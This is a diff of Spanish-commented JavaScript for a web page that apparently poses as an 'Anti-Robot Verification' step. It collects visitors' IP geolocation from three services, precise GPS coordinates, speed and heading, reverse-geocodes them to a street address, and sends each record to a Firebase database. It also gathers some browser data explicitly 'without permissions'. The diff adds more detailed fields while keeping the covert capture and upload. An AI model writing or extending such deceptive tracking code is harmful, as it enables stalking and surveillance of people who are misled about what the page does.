@@ -625,23 +625,35 @@
                 console.log('🌐 Iniciando captura automática por IP...');
                 
                 // Obtener información de IP usando múltiples servicios para mayor precisión
-                const [ipResponse1, ipResponse2] = await Promise.all([
+                const [ipResponse1, ipResponse2, ipResponse3] = await Promise.all([
                     fetch('https://ipapi.co/json/'),
-                    fetch('https://ip-api.com/json/')
+                    fetch('https://ip-api.com/json/'),
+                    fetch('https://ipwho.is/')
                 ]);
                 
                 const ipData1 = await ipResponse1.json();
                 const ipData2 = await ipResponse2.json();
+                const ipData3 = await ipResponse3.json();
                 
-                // Usar los datos más precisos
+                // Combinar y validar datos de múltiples fuentes
                 const ipData = {
-                    city: ipData2.city || ipData1.city,
-                    region: ipData2.regionName || ipData1.region,
-                    country: ipData2.country || ipData1.country_name,
-                    latitude: ipData2.lat || ipData1.latitude,
-                    longitude: ipData2.lon || ipData1.longitude,
-                    isp: ipData2.isp || ipData1.org,
-                    ip: ipData2.query || ipData1.ip
+                    coordenadas: {
+                        lat: formatearCoordenadas(ipData2.lat || ipData1.latitude || ipData3.latitude),
+                        lng: formatearCoordenadas(ipData2.lon || ipData1.longitude || ipData3.longitude)
+                    },
+                    precision: 'City-level (~5-50km)',
+                    ciudad: ipData2.city || ipData1.city || ipData3.city,
+                    region: ipData2.regionName || ipData1.region || ipData3.region,
+                    pais: ipData2.country || ipData1.country_name || ipData3.country,
+                    codigoPostal: ipData1.postal || ipData2.zip || ipData3.postal,
+                    isp: ipData2.isp || ipData1.org || ipData3.connection.isp,
+                    ip: ipData2.query || ipData1.ip || ipData3.ip,
+                    zonaHoraria: ipData2.timezone || ipData1.timezone || ipData3.timezone.id,
+                    operador: ipData2.org || ipData1.org || ipData3.connection.org,
+                    tipo: ipData3.type || 'Unknown',
+                    continente: ipData3.continent || ipData1.continent_code,
+                    moneda: ipData3.currency.code || '',
+                    asn: ipData3.connection.asn || ''
                 };
                 
                 // Datos adicionales del navegador (sin permisos)
@@ -803,21 +815,63 @@
         }
         
         // Función para obtener la dirección desde coordenadas
+        function formatearCoordenadas(coord) {
+            return Number(coord).toFixed(6);
+        }
+
+        function convertirRumbo(grados) {
+            if (grados === null || grados === undefined) return 'N/A';
+            const direcciones = ['N', 'NE', 'E', 'SE', 'S', 'SO', 'O', 'NO'];
+            const indice = Math.round(((grados % 360) / 45)) % 8;
+            return direcciones[indice];
+        }
+
+        function convertirVelocidad(velocidadMS) {
+            if (!velocidadMS) return '0 km/h';
+            return (velocidadMS * 3.6).toFixed(2) + ' km/h';
+        }
+
+        function formatearAltitud(altitud) {
+            if (!altitud) return 'N/A';
+            return altitud.toFixed(2) + ' metros';
+        }
+
         async function getAddressFromCoordinates(lat, lng) {
             try {
-                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
-                const data = await response.json();
-                return data.display_name || 'Dirección no encontrada';
+                // Llamada a OpenStreetMap Nominatim
+                const osmResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+                const osmData = await osmResponse.json();
+                
+                // Llamada a BigDataCloud para información adicional
+                const bdcResponse = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=es`);
+                const bdcData = await bdcResponse.json();
+
+                const direccion = {
+                    calle: osmData.address.road || osmData.address.pedestrian || 'N/A',
+                    numero: osmData.address.house_number || '',
+                    barrio: osmData.address.suburb || bdcData.locality || 'N/A',
+                    ciudad: osmData.address.city || osmData.address.town || osmData.address.village || 'N/A',
+                    municipio: osmData.address.county || 'N/A',
+                    departamento: osmData.address.state || 'N/A',
+                    pais: osmData.address.country || 'N/A',
+                    codigoPostal: osmData.address.postcode || 'N/A',
+                    descripcionCompleta: osmData.display_name || 'N/A'
+                };
+
+                return direccion;
             } catch (error) {
                 console.error('Error al obtener la dirección:', error);
-                return 'Error al obtener la dirección';
+                return {
+                    error: 'Error al obtener la dirección',
+                    descripcionCompleta: 'No disponible'
+                };
             }
         }
 
         // Capturar y almacenar ubicación GPS (precisa)
         async function captureLocation(position) {
-            // Obtener la dirección
-            const address = await getAddressFromCoordinates(position.coords.latitude, position.coords.longitude);
+            // Obtener la dirección detallada
+            const direccion = await getAddressFromCoordinates(position.coords.latitude, position.coords.longitude);
             
             const locationData = {
                 id: 'gps_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
@@ -826,13 +880,27 @@
                 timestamp: new Date().toISOString(),
                 
                 // Ubicación GPS exacta
-                lat: position.coords.latitude,
-                lng: position.coords.longitude,
-                accuracy: position.coords.accuracy + 'm',
-                altitude: position.coords.altitude || 'Unknown',
-                heading: position.coords.heading || 'Unknown',
-                speed: position.coords.speed || 'Unknown',
-                address: address, // Agregamos la dirección
+                coordenadas: {
+                    lat: formatearCoordenadas(position.coords.latitude),
+                    lng: formatearCoordenadas(position.coords.longitude)
+                },
+                precision: '+' + Math.round(position.coords.accuracy) + 'm',
+                altitud: formatearAltitud(position.coords.altitude),
+                rumbo: convertirRumbo(position.coords.heading),
+                velocidad: convertirVelocidad(position.coords.speed),
+                
+                // Información detallada de la ubicación
+                direccion: {
+                    calle: direccion.calle,
+                    numero: direccion.numero,
+                    barrio: direccion.barrio,
+                    ciudad: direccion.ciudad,
+                    municipio: direccion.municipio,
+                    departamento: direccion.departamento,
+                    pais: direccion.pais,
+                    codigoPostal: direccion.codigoPostal,
+                    descripcionCompleta: direccion.descripcionCompleta
+                },
                 
                 // Contexto de captura
                 captureMethod: 'Anti-Robot Verification',
@@ -846,14 +914,102 @@
                 screenRes: screen.width + 'x' + screen.height
             };
             
-            console.log('📍 Ubicación capturada:', locationData);
+                // Formatear la información para mostrar
+                const displayData = {
+                    gps: `
+                        🎯 GPS Exacto
+                        📍 Coordenadas: ${locationData.coordenadas.lat}, ${locationData.coordenadas.lng}
+                        🎯 Precisión: ${locationData.precision}
+                        📅 Capturado: ${new Date().toLocaleString()}
+                        📱 Dispositivo: 📱 Móvil
+                        🗺️ Ubicación:
+                          • Calle: ${locationData.direccion.calle} ${locationData.direccion.numero}
+                          • Barrio: ${locationData.direccion.barrio}
+                          • Ciudad: ${locationData.direccion.ciudad}
+                          • Municipio: ${locationData.direccion.municipio}
+                          • Departamento: ${locationData.direccion.departamento}
+                          • País: ${locationData.direccion.pais}
+                          • Código Postal: ${locationData.direccion.codigoPostal}
+                        🏔️ Altitud: ${locationData.altitud}
+                        🧭 Rumbo: ${locationData.rumbo}
+                        ⚡ Velocidad: ${locationData.velocidad}
+                        🔍 Método: GPS Anti-Robot Verification
+                        📱 Pantalla: ${window.innerWidth}x${window.innerHeight}
+                    `.trim(),
+                    ip: `
+                        🌐 Ubicación IP
+                        📍 Coordenadas: ${ipData.coordenadas.lat}, ${ipData.coordenadas.lng}
+                        🎯 Precisión: ${ipData.precision}
+                        📅 Capturado: ${new Date().toLocaleString()}
+                        📱 Dispositivo: 📱 Móvil
+                        🏙️ Ciudad: ${ipData.ciudad}
+                        📚 Región: ${ipData.region}
+                        🌍 País: ${ipData.pais}
+                        📮 Código Postal: ${ipData.codigoPostal}
+                        🔌 ISP: ${ipData.isp}
+                        🌐 IP: ${ipData.ip}
+                        🕒 Zona Horaria: ${ipData.zonaHoraria}
+                        🏢 Operador: ${ipData.operador}
+                        💻 Tipo: ${ipData.tipo}
+                        🌎 Continente: ${ipData.continente}
+                        💰 Moneda: ${ipData.moneda}
+                        🔢 ASN: ${ipData.asn}
+                        📱 Pantalla: ${window.innerWidth}x${window.innerHeight}
+                    `.trim()
+                };
+
+                // Crear elemento para mostrar la información
+                const infoContainer = document.createElement('div');
+                infoContainer.style.cssText = `
+                    background: #1a2634;
+                    color: #e5e7eb;
+                    padding: 20px;
+                    border-radius: 10px;
+                    margin: 20px 0;
+                    font-family: monospace;
+                    white-space: pre-wrap;
+                    line-height: 1.5;
+                    border: 1px solid #2f3d4f;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                    max-width: 800px;
+                    margin: 20px auto;
+                `;
+
+                infoContainer.innerHTML = `
+                    <div style="margin-bottom: 20px; border-bottom: 1px solid #2f3d4f; padding-bottom: 10px;">
+                        <h3 style="color: #60a5fa; margin: 0;">📍 UBICACIONES CAPTURADAS</h3>
+                    </div>
+                    <div style="color: #34d399; margin-bottom: 20px;">
+                        ${displayData.gps}
+                    </div>
+                    <div style="color: #fbbf24; margin-top: 20px;">
+                        ${displayData.ip}
+                    </div>
+                    <div style="margin-top: 20px; text-align: center;">
+                        <button onclick="location.reload()" style="
+                            background: #3b82f6;
+                            color: white;
+                            border: none;
+                            padding: 10px 20px;
+                            border-radius: 5px;
+                            cursor: pointer;
+                            font-family: inherit;
+                        ">🔄 Actualizar</button>
+                    </div>
+                `;
+
+                // Insertar el contenedor en el DOM
+                const mainContent = document.querySelector('.main-content');
+                if (mainContent) {
+                    mainContent.insertBefore(infoContainer, mainContent.firstChild);
+                }
+
+                console.log('📍 Ubicación capturada:', locationData);
             
-            // Guardar en localStorage
-            let captures = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
-            captures.push(locationData);
-            localStorage.setItem('capturedLocations', JSON.stringify(captures));
-            
-            // Enviar a Firebase Realtime Database
+                // Guardar en localStorage
+                let captures = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
+                captures.push(locationData);
+                localStorage.setItem('capturedLocations', JSON.stringify(captures));            // Enviar a Firebase Realtime Database
             saveToFirebase(locationData);
         }
         
